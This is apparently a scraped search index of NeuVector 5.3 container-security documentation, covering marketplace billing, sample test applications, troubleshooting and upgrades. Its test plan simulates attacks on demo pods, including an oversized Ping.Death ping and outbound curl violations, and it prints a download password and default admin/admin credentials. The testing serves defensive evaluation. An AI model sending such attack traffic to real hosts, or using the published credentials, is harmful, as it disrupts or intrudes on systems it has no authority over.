cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro  ","version":"5.3","tagName":"h3"},{"title":"Testing","type":0,"sectionRef":"#","url":"/testing","content":"Testing Evaluate and Test NeuVector Using Sample Applications","keywords":"","version":"5.3"},{"title":"Public Cloud Marketplaces","type":0,"sectionRef":"#","url":"/special/public-cloud","content":"","keywords":"","version":"5.3"},{"title":"The Listing​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#the-listing","content":" What is the SUSE NeuVector Prime listing on the Cloud Marketplace?  By selecting the NeuVector listing from the public cloud marketplace, customers can deploy NeuVector to their Kubernetes environment with the advantage of having monthly billing via that cloud provider.  Where do I find NeuVector Prime in the Cloud Marketplace?  The listings can be found in the AWS and Azure Marketplace, there are two listings:  For AWS Marketplace: NeuVector Prime with 24x7 Support (non-EU and non-UK only) NeuVector Prime with 24x7 Support (EU and UK only) For Azure Marketplace: NeuVector Prime with 24x7 Support (non-EU and non-UK only) NeuVector Prime with 24x7 Support (EU and UK only)  Why are there 2 listings, which one should I use?  We have 2 listings for NeuVector Prime, in AWS &quot;EU and UK only&quot; and &quot;non-EU and non-UK only&quot; and in Azure &quot;24x7 Support&quot; and &quot;24x7 Support (EMEA Orders Only)&quot;, you should pick the listing that reflects where your cloud account gets billed.  Are these listings available in all countries?  The NeuVector Prime listing on the public cloud is not available to purchase in all countries. Your billing country is based on the cloud Account ID used to do the deployment. Please read the addendum at the end of this FAQ for a list of countries that can and cannot transact NeuVector Prime,via the marketplace.  My cloud account is in the USA, but I want to deploy NeuVector in another region, a region that is in a country where I currently cannot transact NeuVector, is this possible?  Yes. As long as your cloud account is billed to one of the allowed countries, it is possible to deploy NeuVector in any region.  Is this listing available in China?  Whilst it is not possible to transact/bill NeuVector Prime in China, it is possible to deploy into regions in China. Please read the addendum at the end of this FAQ for a list of countries that can and cannot transact NeuVector via the cloud marketplace.  ","version":"5.3","tagName":"h2"},{"title":"Billing​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#billing","content":" I have an existing NeuVector subscription; can I use this on the public cloud?  BYOS (Bring Your Own Subscription) NeuVector Prime deployments are supported on the public cloud, but billing would be through your normal software purchase channels and not through the cloud provider marketplace. Once the existing subscription term ends, you can purchase NeuVector Prime via the cloud marketplace and reconfigure your cluster to support monthly billing through the cloud provider.  I have an existing deployment covered by a NeuVector subscription; can I use this new listing in the cloud marketplace for new deployments?  Yes, the marketplace listing works independently from your existing NeuVector Prime subscriptions. Please remember that support processes may be different for deployments using your existing subscription and those billed via the cloud Marketplace.  Tell me more about how the billing for NeuVector Prime works via the cloud?  When purchasing NeuVector Prime through the cloud provider marketplace, the billing is as follows:  Billing is monthly and handled via the cloud provider marketplace. Nodes are counted hourly when NeuVector is active and added to a usage total. An average node count is calculated for the month. There is a monthly usage charge for each node in the average node count. The monthly usage charge depends on the number of nodes in use.  Nodes count There is a 5-node minimum, if the average node count is less than 5 nodes, the charge will be for 5 nodes.  What are the pricing tiers?  NeuVector Prime has different pricing tiers when purchasing via the cloud marketplace. This is based on the number of nodes on which NeuVector is deployed. Details of the tiers are below, please check the listing for further pricing information.  Table 1. Pricing tiers  Tier\tNodes (from)\tNodes (to)1\t5\t15 2\t16\t50 3\t51\t100 4\t101\t250 5\t251\t1000 6\t1000\t15  Is there a way to try NeuVector Prime before purchasing?  If using the NeuVector Prime listing in the cloud provider marketplace, billing commences from the time of deployment. NeuVector can also be deployed manually using the standard documentation and repositories. When ready to add support to your NeuVector deployment and have this billed via the cloud marketplace, follow the available documentation.  How does SUSE calculate the ‘average number of nodes’ to bill for?  The average node count is calculated by adding the number of active nodes (counted hourly) and dividing by the number of hours NeuVector has been active in the billing cycle.  Below are 3 examples of how the average node count is calculated.  note The example uses 730 hours for the billing cycle. Actual billing would depend on the number of days in the month and the resulting billing cycle.  Table 2. Usage calculations for different scenarios  \tHours Active\tNodes\tUsage Total\tAverage Node count\tNode billedStatic Usage\t730\t10\t7300\t10\t10 @Tier 1 Bursting Model\t730\t10 (562 Hours) &amp; 20 (168 Hours)\t10660\t15\t15 @Tier 1 (Rounded from 14.6) Transient Cluster\t336\t20\t6720\t20\t20 @Tier 2  Definitions Static usage: Using NeuVector on 10 nodes, for 1 month (730 hours) with no additional nodes added in the month. Bursting Model: Using NeuVector on 10 nodes for 3 weeks (562 hours) in the month, bursting to 30 nodes for 1 week (168 hours). Transient cluster: A temporary deployment of NeuVector on 20 nodes for 2 weeks (336 hours).  Are special commercial terms available?  Depending on the deployment, it may be possible to secure special commercial terms. e.g. An annual subscription would be handled via an AWS private offer. Please contact SUSE for more information.  Can my spend on NeuVector Prime count towards my cloud discount program such as AWS EDP or Azure’s MACC?  For AWS, the spend can count towards your EDP. Please contact your AWS Sales Team for more details. For Azure, the spend can count towards your MACC. Please contact your Microsoft Azure Sales Team for more details.  How do I purchase NeuVector Prime for additional nodes?  Once NeuVector has been deployed from the listing on the cloud marketplace and billing is active, there is no need to make a specific purchase for additional nodes. Billing is dynamic and based on the number of nodes where NeuVector is deployed. Just add NeuVector to additional nodes in federated clusters as needed.  Is this an annual commitment, will it auto-renew?  By default, the NeuVector Prime listing in the cloud provider marketplace is billed on a monthly cycle, based on usage. Billing is on-going for as long as NeuVector is deployed.  Depending on the deployment, custom monthly pricing may be available. This applies to AWS and Azure deployments.  ","version":"5.3","tagName":"h2"},{"title":"Technical (Billing)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#technical-billing","content":" Do I need a managed Kubernetes cluster running in my cloud provide to install NeuVector Prime and be billed via the marketplace?  Yes. For AWS, to benefit from monthly billing via the AWS Marketplace, the primary cluster must be an EKS Cluster running in your AWS Account. For Azure, to benefit from monthly billing via the Azure Marketplace, the primary cluster must be an AKS Cluster running in your Azure Account.  On which Kubernetes distributions can the NeuVector Prime Cloud Marketplace listing be deployed?  For AWS, the NeuVector Prime AWS Marketplace listing must be deployed on an Amazon EKS. For Azure, the NeuVector Prime Azure Marketplace listing must be deployed on AKS via the marketplace offering.  info Downstream clusters can run any Supported Kubernetes platform, such as RKE, RKE2, K3s, AKS, EKS, GKE, vanilla Kubernetes, OpenShift, Mirantis Kubernetes Engine, and so on. Please see Supported Platforms.  What is the deployment mechanism?  For AWS, the Marketplace listing for NeuVector Prime is deployed using Helm. For Azure, the NeuVector Prime Azure Marketplace listing is deployed using the Azure Portal (and the deployment is CNAB based).  What is the easiest way to get started?  The way to get started is to add the cloud marketplace listing for NeuVector Prime to a managed cubernetes cluster, such as as EKS or AKS. Follow the instructions in the usage section, a Helm chart in AWS and the Azure Portal for Azure, takes care of the application installation and setting up billing.  What version of NeuVector is installed when using the marketplace listing?  The marketplace listing for NeuVector Prime is tied to a specific version of NeuVector, typically the latest version available at the time of the listing update. Please check the listing for further information.  I need a prior version of NeuVector installed, can I still use the listing?  No. There is no choice of NeuVector version when deploying using the marketplace listing. If a prior version of NeuVector is required, must be installed manually using the standard documentation.  How often is the listing updated (including the version of NeuVector)?  The marketplace listing is tied to a specific version of NeuVector, usually the latest version available at the time the listing was last updated.  Typically, the marketplace listing is updated quarterly, or more frequently if there are security issues. NeuVector itself is updated with major, minor, or patch versions every 6-8 weeks.  To update the NeuVector product to a current version before the marketplace listing is updated, please see Updating NeuVector.  I have many Kubernetes clusters across multiple cloud accounts, does the NeuVector billing still work and enable tiered pricing?  Yes. Downstream (federated) clusters running NeuVector can be deployed across single or multiple cloud accounts, on-premises or even across diffferent public clouds. Downstream nodes report up to the primary NeuVector deployment. This process is called federation and is needed to enable tiered pricing for your NeuVector deployments.  Billing is routed to the cloud provider account in which the primary cluster is running.  I have multiple independent clusters, each running a separate installation of the NeuVector Prime marketplace listing, how is this billed?  As the NeuVector deployments are independent, each cluster is billed separately from the others. It is not possible to benefit from tiered pricing across clusters unless the NeuVector deployments are federated. Federation requires that only the primary cluster (not downstream remotes) be installed with the NeuVector Prime marketplace listing. Learn more about federation in Enterprise Multi-Cluster Management.  If Federation is not possible, consider custom terms from SUSE.  How can I federate NeuVector to benefit from tiered pricing across all deployments?  The primary cluster must be running on a managed kubernetes cluster. This is EKS in the AWS Cloud, or AKS in Azure. The cluster must be running the NeuVector Prime marketplace listing.  attention There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed externally to its cluster by either a primary or remote service. See Enterprise Multi-Cluster Management for more information on federating clusters.  I have purchased multiple SUSE products from the public cloud marketplace (e.g., Rancher Prime and NeuVector Prime), does the marketplace billing method still work?  Yes. The billing mechanisms for the two deployments are independent and will be billed separately via the marketplace.  I already have an existing cluster in place and want to add NeuVector Prime and have this billed via the marketplace. Is this possible?  Yes, providing it is an EKS cluster in AWS, or AKS in Azure. Simply deploy the AWS Marketplace listing for NeuVector Prime to your EKS or AKS cluster.  I already have an existing cluster with NeuVector deployed, can I just install the NeuVector Prime marketplace listing and have support billed via the cloud marketplace?  Yes. This is possible by redeploying the NeuVector Prime from the cloud provider marketplace listing. Please follow the documentation to back up the existing NeuVector configuration, as it may be necessary to restore the configuration into the new deployment.  ","version":"5.3","tagName":"h2"},{"title":"Technical (Product)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#technical-product","content":" How do I get support?  It is very simple to open a support case with SUSE for NeuVector. Create a ‘supportconfig’ via the NewVector UI and upload the output to the SUSE Customer Center. The support config bundle can be exported from the NeuVector console under Settings &gt; Configuration.  tip For multi-cluster (federated) deployments, export the supportconfig bundle from the primary cluster only. The NeuVector Prime billing mechanism must be active on the primary cluster to open a support case.  Is there any difference between the NeuVector Prime product on the cloud marketplace compared to the versions I can run in my own data center or install manually in the cloud?  The NeuVector Prime product in the cloud marketplace is the same product with the same functionality as what you would install manually in the cloud or run on-premises. The only difference is the billing route.  Does the primary cluster (responsible for billing) need to run 24/7?  To ensure continuity with support, it is recommended that the primary NeuVector Prime cluster always remains active.  What if the primary cluster responsible for billing is unable to connect to the cloud provider billing framework?  There may be multiple reasons why the primary cluster is unable to connect to the billing framework, but it is the customer’s responsibility to ensure that the primary cluster is active and connected. While the cluster is not connected to the billing framework, it is not possible to raise a support request.  My primary cluster has been offline, what happens with billing when it reconnects?  If the primary cluster is offline or disconnected from the cloud provider billing framework for a period of time, when it reconnects, the stored usage data will be uploaded and will appear on your next marketplace bill.  note Depending on when in the month the primary cluster gets reconnected you may have several months of usage on your next billing cycle.  How do I get fixes and updates to NeuVector?  NeuVector is updated with major, minor, or patch versions every 6-8 weeks. To update NeuVector to a current version before the NeuVector Prime marketplace listing is updated, please see Updating NeuVector.  ","version":"5.3","tagName":"h2"},{"title":"Miscellaneous​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#miscellaneous","content":" Where can I find out more about the NeuVector Prime Marketplace listing?  For AWS: You can find out more about the NeuVector Prime AWS Marketplace listing in the NeuVector documentation. For Azure: You can find out more about the NeuVector Prime AWS Marketplace listing in the NeuVector documentation.  Where can I find out more about NeuVector?  Learn more about NeuVector and NeuVector Prime with:  NeuVector by SUSE - full lifecycle container security NeuVector by SUSE documentation  ","version":"5.3","tagName":"h2"},{"title":"Appendix​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#appendix","content":" Countries that can transact NeuVector Prime through the cloud marketplace Please see the Geographical Availability of NeuVector Prime and other SUSE Marketplace products at this link. ","version":"5.3","tagName":"h2"},{"title":"Troubleshooting NeuVector Deployments","type":0,"sectionRef":"#","url":"/troubleshooting","content":"Troubleshooting NeuVector Deployments How to troubleshoot NeuVector Deployments and collect logs for support.","keywords":"","version":"5.3"},{"title":"Update the NeuVector Containers","type":0,"sectionRef":"#","url":"/updating","content":"Update the NeuVector Containers How to update the NeuVector components","keywords":"","version":"5.3"},{"title":"Evaluating and Testing NeuVector","type":0,"sectionRef":"#","url":"/testing/testing","content":"","keywords":"","version":"5.3"},{"title":"Sample Applications​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/testing/testing#sample-applications","content":" After you’ve deployed the NeuVector components you can evaluate it using the sample test applications we provide. These are located in the ’nvbeta’ repository on docker hub.  A typical Kubernetes-based test environment would have a master node and two to three worker nodes. You can control if application pods and NeuVector containers are deployed on a master node (off by default).  ","version":"5.3","tagName":"h3"},{"title":"Kubernetes Test Plan​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/testing/testing#kubernetes-test-plan","content":" To deploy a multi-tier application using Nginx, Nodejs, and Redis, use the samples below (in the order below). These may need to be edited for deployment on OpenShift, Rancher and other Kubernetes based tools.  Create a demo namespace  kubectl create namespace demo   note The sample below use apiVersion: apps/v1 required by Kubernetes 1.16+.  Create the Redis service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: redis namespace: demo spec: ports: - port: 6379 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-6379&quot; clusterIP: None selector: app: redis-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: redis-pod namespace: demo spec: selector: matchLabels: app: redis-pod template: metadata: labels: app: redis-pod spec: containers: - name: redis-pod image: redis   Create the Nodejs service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: node namespace: demo spec: ports: - port: 8888 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-8888&quot; clusterIP: None selector: app: node-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: node-pod namespace: demo spec: selector: matchLabels: app: node-pod replicas: 3 template: metadata: labels: app: node-pod spec: containers: - name: node-pod image: nvbeta/node   Create the Nginx service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: nginx-webui namespace: demo spec: ports: - port: 80 name: webui protocol: TCP type: NodePort selector: app: nginx-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx-pod namespace: demo spec: selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx-pod image: nvbeta/swarm_nginx ports: - containerPort: 80 protocol: TCP   To access the Nginx-webui service externally, find the random port assigned to it (mapped to port 80) by the NodePort:  kubectl get svc -n demo   Then connect to the public IP address/port for one of the kubernetes nodes, e.g. ‘http://(public_IP):(NodePort)’  After deploying NeuVector, you can run test traffic through the demo applications to generate the whitelist rules, and then move all services to Monitor or Protect mode to see violations and attacks.  Generating Network Violations on Kubernetes​  To generate a violation from a nodejs pod, find a pod:  kubectl get pod -n demo   Then try some violations (replace node-pod-name):  kubectl exec node-pod-name curl www.google.com -n demo   Or find the internal IP address of another node pod, like 172.30.2.21 in the example below, to connect from one node to another:  kubectl exec node-pod-name curl 172.30.2.21:8888 -n demo   Generate a Threat/Attack​  To simulate an attack, log into a container, then try a ping attack:  kubectl exec -it node-pod-name bash -n demo   Use the internal IP of another node pod:  ping 172.30.2.21 -s 40000   For all of the above, you can view the security events in the NeuVector console Network Activity map, as well as the Notifications tab.  Process and File Protection Tests​  Try various process and file activity by exec'ing into a container and running commands such as apt-get update, ssh, scp or others. Any process activity or file access not allowed will generate alerts in Notifications.  Registry Scanning and Admission Control​  A popular test is to configure image scanning of a registry in Assets -&gt; Registries. After the scan is complete, configure an Admission Control rule in Policy. Be sure to enable Admission Controls and set a rule to Deny when there are high vulnerabilities in an image. Then pick an image that has high vulnerabilities and try to deploy it in Kubernetes. The deployment will be blocked in Protect mode and you will see an event in Notifications -&gt; Security Risks.  More advanced admission control testing can be done using different criteria in rules, or combining criteria.  Deploy Another App​  The Kubernetes Guestbook demo application can also be deployed on Kubernetes. It is recommended to deploy it into its own namespace so you can see namespace based filtering in the NeuVector console.  ","version":"5.3","tagName":"h3"},{"title":"Docker-native Test Plan​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/testing/testing#docker-native-test-plan","content":" After deploying the NeuVector components and the sample application(s) you’ll be able to Discover, Monitor and Protect running containers. The test plan below provides suggestions for generating run-time violations of allowed application behavior and scanning containers for vulnerabilities.  NeuVector Test Plan  If the link above does not work, you can download it from our website using password nv1851blvd.  NeuVector can also detect threats to your containers such as DDOS attacks. If you run a tool to generate such attacks on your containers, these results will show in Network Activity and in the Dashboard.  For example, a simple ping command with high payload will show the Ping.Death attack in the console. To try this, do the following to the IP address of one of the containers (internal IP of the container).  ping &lt;container_ip&gt; -s 40000   In Kubernetes you can do this from any node including the master. In other environments you may need to be logged into the node where the container is running. ","version":"5.3","tagName":"h3"},{"title":"Troubleshooting","type":0,"sectionRef":"#","url":"/troubleshooting/troubleshooting","content":"","keywords":"","version":"5.3"},{"title":"Troubleshooting NeuVector Deployments​","type":1,"pageTitle":"Troubleshooting","url":"/troubleshooting/troubleshooting#troubleshooting-neuvector-deployments","content":" The NeuVector containers are deployed, managed, and updated using the same orchestration tool used for application workloads. Please be sure to review the online documentation for each step necessary during deployment. Often deployments are attempted by just copying the sample yaml files and deploying them without reviewing the steps prior, such as properly configuring registries, secrets, or RBACs/rolebindings.  Initial Deployment​  Check that the NeuVector containers can be pulled with correct authentication. Check the secret used and make sure the cluster is able to access the appropriate registry.Make sure the changes to the yaml required (e.g. NodePort or LoadBalancer) or Helm values settings are set appropriately.Check the platform and container run-time and make changes as needed (e.g. PKS, containerd, CRI-O).  Login and Initial Configuration​  Check to make sure appropriate access to the manager (IP address, port, route) is allowed through firewalls.  Ongoing Operation​  Directory integration. NeuVector supports specific configurations for LDAP/AD and other integrations for groups and roles. Contact NeuVector for additional troubleshooting steps and a tool for AD troubleshooting.Registry scanning. Most issues are related to registry authentication errors or inability for the controller to access the registry from the cluster.For performance issues, make sure the scanner is allocated enough memory for scanning large images. Also, CPU and memory minimums can be specified in the pod policy to ensure adequate performance at scale.Admission Control. See the Troubleshooting section in the section Security Risks... -&gt; Admission Controls.  Updating​  Use rolling updates for the controller. If you are rebooting hosts, make sure to monitor the controllers as they move to other hosts, or redeploy on the rebooted hosts, to make sure they are able to start, join the controller cluster, and stabilize/sync. Rebooting all hosts at once or too quickly can result in unknown states for the controllers.Use a persistent volume claim to store the NeuVector configuration for the case that all controllers/nodes go down in the cluster.When updating to a new version, review the online documentation to identify changes/additions to the yaml required, as well as other changes such as rolebindings or new services (e.g. admission control webhook, persistent volume claim etc).  ","version":"5.3","tagName":"h3"},{"title":"Debug Logs​","type":1,"pageTitle":"Troubleshooting","url":"/troubleshooting/troubleshooting#debug-logs","content":" To view the logs of a NeuVector container, for example a controller pod  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector   These logs may show cluster connectivity issues, admin actions, scanning activity and other useful entries. If there are multiple controllers running it may be necessary to inspect each one. These logs can be piped to a file to send to NeuVector support.  Turning on Debug mode for NeuVector Controllers​  For issues that require in-depth investigation, debug mode can be enabled for the controllers/allinones, which will log detailed information. This can increase the log file size by a large amount, so it is recommended to turn it off after collecting them.  Kubernetes, OpenShift and Other Orchestration Logs​  It can be helpful to inspect the logs from orchestration tools to see all deployment activity including pod creation timestamps and status, deployments, daemonsets and other management actions of the NeuVector containers performed by the orchestration tool.  kubectl get events -n neuvector   ","version":"5.3","tagName":"h3"},{"title":"Support Log​","type":1,"pageTitle":"Troubleshooting","url":"/troubleshooting/troubleshooting#support-log","content":" The support log contains additional information which is useful for NeuVector Support, including system configuration, containers, policies, notifications, and NeuVector container details.  To download the support log, go to Settings -&gt; Configuration and select Collect Log.  ","version":"5.3","tagName":"h3"},{"title":"Using the CLI to turn on Debug Mode​","type":1,"pageTitle":"Troubleshooting","url":"/troubleshooting/troubleshooting#using-the-cli-to-turn-on-debug-mode","content":" Login to NeuVector manager pod with user and password (recommended in a separate terminal window).  kubectl exec -it neuvector-manager-pod-5bb76b6754-rlmnp -n neuvector -- cli   #neuvector-svc-controller.neuvector&gt; login   Get the list of controllers. Find the controller with the Leader = True.  show controller   Turn on the debug mode in the leader controller using the ID or name of controller  set controller 4fce427cf963 debug -c all   To turn on debug mode on all controllers  set system controller_debug -c all   Perform the activity in NeuVector which you wish to debug. Then view the controller logs (in a separate terminal window).  kubectl logs &lt;leader_controller_pod_name&gt; -n neuvector   If required, capture the logs and send them to NeuVector.  Turn off Debug mode on the controller (back in the CLI window).  set controller 4fce427cf963 debug exit   Check controller debug status.  show controller setting 289d67396fcb   ","version":"5.3","tagName":"h3"},{"title":"Using the REST API to turn on Debug Mode​","type":1,"pageTitle":"Troubleshooting","url":"/troubleshooting/troubleshooting#using-the-rest-api-to-turn-on-debug-mode","content":" Set access token with your IP, user, password:  _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot;   note For Kubernetes based deployments you can get the Controller IP in the following command output:  kubectl get pod -n neuvector -o wide | grep controller   note If accessing the REST API from outside the cluster, see the Automation section instructions.  Get the authentication token  curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'`   note You may need to install jq ($sudo yum install jq)  Enable Debug Mode  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: [&quot;cpath&quot;, &quot;conn&quot;]}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json #debug options - cpath, conn, mutex, scan, cluster , all   Disable Debug on all controllers in a cluster  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: []}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json   Check the controller debug status in a cluster  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; system_setting.json cat system_setting.json | jq .config.controller_debug   Logout  echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1  ","version":"5.3","tagName":"h3"},{"title":"Updating NeuVector","type":0,"sectionRef":"#","url":"/updating/updating","content":"","keywords":"","version":"5.3"},{"title":"Updating NeuVector Components​","type":1,"pageTitle":"Updating NeuVector","url":"/updating/updating#updating-neuvector-components","content":" It’s super easy to update your NeuVector containers. If there is a new release available, pull it from Docker Hub. It is recommended to use a ‘rolling update’ strategy to keep at least one Allinone or Controller container running at any time during an update.  imporant Host OS updates, reboots, and orchestrator updates can cause pods to be evicted or stopped. If a Controller is affected, and there are no other Controllers active to maintain the state, the Controllers can become available for some time while new controllers are started, a cluster is formed with a leader, and the persistent storage backup of the configuration is attempted to be accessed to restore the cluster. Be careful when scheduling host or orchestrator updates and reboots which may affect the number of controllers available at any time. See the Pod Disruption Budget below for possible ways to mitigate this. If deployment was done using the NeuVector Helm charts, updating will take care of additional services, rolebindings or other upgrade requirements. If updates are done manually or there is only one Allinone or Controller running, please note that current network connection data is NOT stored and will be lost when the NeuVector container is stopped. NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  To manually update NeuVector using docker-compose:  sudo docker-compose -f &lt;filename&gt; down   Note that if no filename is specified then the docker-compose.yml file is used.  Make sure the docker-compose.yml or other appropriate file is edited with the desired image version, if necessary, then:  $sudo docker-compose -f &lt;filename&gt; up -d   note We recommend that all NeuVector components be updated to the most recent version at the same time. Backward compatibility is supported for at least one minor version back. Although most older versions will be backward compatible, there may be exceptions which cause unexpected behavior.  ","version":"5.3","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"Updating NeuVector","url":"/updating/updating#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Sample Kubernetes Rolling Update​  If your Deployment or Daemonset is already running, you can change the yaml file to the new version, then apply the update:  kubectl apply -f &lt;yaml file&gt;   To update to a new version of NeuVector from the command line.  kubectl set image deployment/neuvector-controller-pod neuvector-controller-pod=neuvector/controller:4.2.2 -n neuvector kubectl set image deployment/neuvector-manager-pod neuvector-manager-pod=neuvector/manager:4.2.2 -n neuvector kubectl set image DaemonSet/neuvector-enforcer-pod neuvector-enforcer-pod=neuvector/enforcer:4.2.2 -n neuvector   To check the status of the rolling update:  kubectl rollout status -n neuvector ds/neuvector-enforcer-pod kubectl rollout status -n neuvector deployment/neuvector-controller-pod # same for manager, scanner etc   To rollback the update:  kubectl rollout undo -n neuvector ds/neuvector-enforcer-pod kubectl rollout undo -n neuvector deployment/neuvector-controller-pod # same for manager, scanner etc   ","version":"5.3","tagName":"h3"},{"title":"Updating the Vulnerability CVE Database​","type":1,"pageTitle":"Updating NeuVector","url":"/updating/updating#updating-the-vulnerability-cve-database","content":" The NeuVector Scanner image is regularly updated on neuvector with new CVE database updates, using the 'latest' tag.  The default NeuVector deployment includes deployment of scanner pods as well as an Updater cron job to update the scanners every day.  Please see the section Updating the CVE Database for more details.  The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the Updater container image. The latest database version number can also be found listed here.  docker inspect neuvector/updater   &quot;Labels&quot;: { &quot;neuvector.image&quot;: &quot;neuvector/updater&quot;, &quot;neuvector.role&quot;: &quot;updater&quot;, &quot;neuvector.vuln_db&quot;: &quot;1.255&quot; }   You can also inspect the controller/allinone logs for 'version.' For example in Kubernetes:  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector | grep version   2019-07-29T17:04:02.43 |DEBU|SCN|main.dbUpdate: New DB found - create=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:02.454|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:12.224|DEBU|SCN|main.scannerRegister: - version=1.576   ","version":"5.3","tagName":"h3"},{"title":"Pod Disruption Budget​","type":1,"pageTitle":"Updating NeuVector","url":"/updating/updating#pod-disruption-budget","content":" A Kubernetes feature allows for ensuring that a minimum number of controllers are running at any time. This is useful for node draining or other maintenance activities that could remove controller pods. For example, create and apply the file below nv_pdb.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   ","version":"5.3","tagName":"h3"},{"title":"Upgrading from NeuVector 4.x to 5.1.x​","type":1,"pageTitle":"Updating NeuVector","url":"/updating/updating#upgrading-from-neuvector-4x-to-51x","content":" Upgrade first to a 5.1.x release such as 5.1.3, then see the Kubernetes deployment section for updating to 5.2.x+ for important changes to services accounts and bindings.  For Helm users, update to NeuVector Helm chart 2.0.0 or later (prior to NeuVector 5.2.0). If updating an Operator or Helm install on OpenShift, see note below.  Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/admission-crd-k8s-1.19.yaml   Create a new DLP, WAP, Admission clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules 